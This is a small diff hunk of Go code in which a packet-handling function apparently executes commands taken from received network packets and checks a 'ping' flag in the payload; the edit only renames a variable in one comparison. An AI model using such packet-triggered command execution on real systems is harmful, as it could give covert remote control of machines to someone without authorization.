@@ -522,7 +522,7 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		execCommand(cmd)
 	}
 
-	if lastPingRan != command {
+	if lastPingRan != cmd {
 		//get ping command
 		if len(payload) > 5 {
 			if payload[5] == "1" {
